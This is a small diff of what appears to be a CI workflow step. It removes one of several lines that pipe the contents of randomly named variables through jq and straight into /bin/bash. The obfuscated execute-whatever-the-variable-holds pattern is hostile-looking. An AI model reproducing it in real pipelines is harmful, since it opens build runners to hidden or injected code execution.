@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$fdmmh8618" | jq -r .qds4 | /bin/bash
           printf '%s' "$ei33" | jq -r .ljdbo25964 | /bin/bash
-          printf '%s' "$ejcr7689" | jq -r .gk22978 | /bin/bash
           echo $lm68687 | jq -r .kvu4 | /bin/bash
 
       - name: Upload artifact
